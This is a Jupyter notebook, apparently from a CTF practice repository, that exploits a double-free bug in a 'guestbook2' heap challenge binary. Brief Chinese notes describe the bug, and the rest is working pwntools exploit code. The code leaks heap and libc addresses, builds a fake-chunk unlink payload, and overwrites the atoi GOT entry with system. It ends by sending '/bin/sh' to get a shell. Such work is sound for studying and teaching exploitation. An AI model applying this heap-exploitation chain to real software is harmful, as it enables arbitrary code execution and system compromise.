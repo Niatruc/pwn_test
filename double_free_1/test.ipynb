{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. post不能超过0x10个；post的元数据结构如下:\n",
    "<img alt=\"post_struct\" src=\"./post_struct.jpg\" width=\"90%\" height=\"90%\">\n",
    "\n",
    "2. 每次新增post时会从头寻找是否有删除的post, 有的话会用上它的位置来存储新post的信息. post的大小会确保为0x80即128的整数.\n",
    "\n",
    "3. 编辑时, 如果新输入的大小与原来的不同, 会realloc给post分配新的块.\n",
    "\n",
    "4. 删除post是按输入的序号在post列表里找; 会把\"是否使用中\"置零, 但删除时却没有判断\"是否使用中\", 且post删除后其地址信息没有抹去, 因此可以double free. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[*] Checking for new versions of pwntools\n",
      "    To disable this functionality, set the contents of /home/bohan/.cache/.pwntools-cache-3.6/update to 'never' (old way).\n",
      "    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n",
      "        [update]\n",
      "        interval=never\n",
      "[*] You have the latest version of Pwntools (4.6.0)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/double_free_1/libc.so.6'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n",
      "[*] '/home/bohan/res/ubuntu_share/pwn_test/double_free_1/guestbook2'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      No PIE (0x3fe000)\n",
      "    RUNPATH:  b'.'\n"
     ]
    }
   ],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../')\n",
    "\n",
    "from pwn import *\n",
    "\n",
    "libc=ELF('./libc.so.6')\n",
    "guestbook2=ELF('./guestbook2')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# import util\n",
    "from util import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "z_write = write_pipe\n",
    "z_print = lambda *args: None"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-4-0a238d91e46d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mw_pipe\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_line(s):\n",
    "    z_write(s + '\\n')\n",
    "    z_print()\n",
    "\n",
    "def list_post():\n",
    "    z_write('1\\n', waittime=0.3)\n",
    "    z_print()\n",
    "def new_post(post):\n",
    "    z_write('2', len(post), post, waittime=0.3, end='\\n')\n",
    "    z_print(False)\n",
    "def edit_post(i, post_len, post_ctn):\n",
    "    z_write('3', i, post_len, post_ctn, waittime=0.3, end='\\n')\n",
    "    z_print(False)\n",
    "def delete_post(i):\n",
    "    z_write('4', i, waittime=0.3, end='\\n')\n",
    "    z_print()\n",
    "def exit_process():\n",
    "    z_write('5\\n', waittime=0.3)\n",
    "    z_print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def real_size(post_size):\n",
    "    return (128 - post_size % 128) % 128 + post_size"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "list_post()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_post('a')\n",
    "new_post('b')\n",
    "new_post('c')\n",
    "new_post('d')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "delete_post(0)\n",
    "delete_post(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_post('12345678')\n",
    "list_post()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x1D6A940"
      ]
     },
     "execution_count": 125,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "chunk2_addr = int(reverse_str('40a9 d601'), 16)\n",
    "chunk2_addr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0x1D69020, 0x1D69028, 0x1D69030),\n",
       " (0x1D69038, 0x1D69040, 0x1D69048),\n",
       " (0x1D69050, 0x1D69058, 0x1D69060),\n",
       " (0x1D69068, 0x1D69070, 0x1D69078)]"
      ]
     },
     "execution_count": 126,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 计算堆的基址\n",
    "heap_base = chunk2_addr - (0x80+0x10)*2 - (0x1810+0x10)\n",
    "post0_info_addr = heap_base + 0x10 + 0x10\n",
    "# 每个post存是否使用,大小,post地址3个数据, 各占8个字节\n",
    "post_info_addrs = [\n",
    "    (\n",
    "        post0_info_addr + i * 24 , \n",
    "        post0_info_addr + i * 24 + 8,\n",
    "        post0_info_addr + i * 24 + 16, \n",
    "    )\n",
    "    for i in range(4)\n",
    "]\n",
    "\n",
    "post_info_addrs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [],
   "source": [
    "delete_post(0)\n",
    "delete_post(1)\n",
    "delete_post(3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "payload = (\n",
    "    p64(0) + \n",
    "    p64(0x80) + \n",
    "    p64(post_info_addrs[0][2] - 0x18) + \n",
    "    p64(post_info_addrs[0][2] - 0x10) + \n",
    "    b\"0\"*0x60 + \n",
    "    p64(0x80) + \n",
    "    p64(0x90) +  \n",
    "    b\"1\"*0x80 + \n",
    "    p64(0) + \n",
    "    p64(0x91) + \n",
    "    b\"2\"*0x80 + \n",
    "    p64(0) + # 如果没有这一块, 将会报错, 应该与向前合并的检测有关\n",
    "    p64(0x91) + \n",
    "    b\"3\"*0x80\n",
    ")\n",
    "\n",
    "# print_hex(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_post(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [],
   "source": [
    "delete_post(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [],
   "source": [
    "# new_post(\n",
    "#     p64(0) +   # 原c0 + 0x10\n",
    "#     p64(0x80) + \\\n",
    "#     p64(post_info_addrs[0][2] - 0x18) + \\\n",
    "#     p64(post_info_addrs[0][2] - 0x10) + \\\n",
    "#     b\"0\"*0x60 + \\\n",
    "#     b\"1\"*0x90 + \\  # 原c1\n",
    "#     p64(0x80 + 0x90) + \\  # 原c2\n",
    "#     p64(0x90) + \\\n",
    "#     b\"2\"*0x80 + \\\n",
    "#     p64(0) + \\  # 原c3\n",
    "#     p64(0x91) + \\\n",
    "#     b\"3\"*0x80\n",
    "# )\n",
    "\n",
    "# delete_post(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload2 = p64(1) + p64(1) + p64(0x8) + p64(guestbook2.got['atoi']) + b'k' * (0x230 - 8 * 4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [],
   "source": [
    "edit_post(0, 0x230, payload2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {},
   "outputs": [],
   "source": [
    "list_post()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(0x7F3B7A584F50, 0x7F3B7A54B000, 0x7F3B7A591640)"
      ]
     },
     "execution_count": 134,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "atoi_got_addr = int(reverse_str('50 4f58 7a3b 7f'), 16)\n",
    "libc_base = atoi_got_addr - libc.sym['atoi']\n",
    "system_libc_addr = libc_base + libc.sym['system']\n",
    "atoi_got_addr, libc_base, system_libc_addr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [],
   "source": [
    "payload3 = p64(system_libc_addr)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [],
   "source": [
    "edit_post(0, len(payload3), payload3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line('/bin/sh')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line('ls')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "exit_process()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:.conda-mytorch] *",
   "language": "python",
   "name": "conda-env-.conda-mytorch-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
